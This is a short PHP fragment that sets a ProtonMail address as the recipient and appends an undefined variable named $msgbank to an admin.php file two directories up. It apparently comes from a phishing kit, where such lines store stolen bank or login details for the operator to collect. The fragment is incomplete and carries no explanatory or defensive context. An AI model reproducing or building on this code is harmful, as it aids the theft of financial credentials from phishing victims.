<?php

$yourmail  = 'alefnetwork@pm.me';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>